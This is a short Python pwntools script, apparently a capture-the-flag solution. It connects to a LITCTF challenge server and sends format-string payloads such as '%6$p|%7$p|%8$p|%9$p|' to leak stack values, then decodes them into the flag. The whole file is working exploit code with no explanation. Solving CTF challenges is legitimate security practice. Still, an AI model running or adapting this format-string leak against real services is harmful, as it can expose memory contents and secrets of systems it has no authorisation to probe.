from pwn import *

def leak():
    temp = r.recvuntil(b"|")
    temp = str(temp)
    temp = temp.replace("b'","")
    temp = temp.replace("|'","")
    temp = int(temp,16)
    temp = p64(temp)
    return temp
r = remote("litctf.live" ,31791)
r.sendlineafter(b'Do you like waifus?\n' ,b"%6$p|%7$p|%8$p|%9$p|")
r.recvuntil(b"\nWtmoo how could you say:\n")
flag = leak()
flag += leak()
flag += leak()
flag += leak()
r.close()
r = remote("litctf.live" ,31791)
r.sendlineafter(b'Do you like waifus?\n' ,b"%10$p|")
r.recvuntil(b"\nWtmoo how could you say:\n")
flag += leak()
r.close()
flag = str(flag)
flag = flag.replace("b'","")
flag = flag.replace("'","")
log.info(f"[FLAG] {flag}")
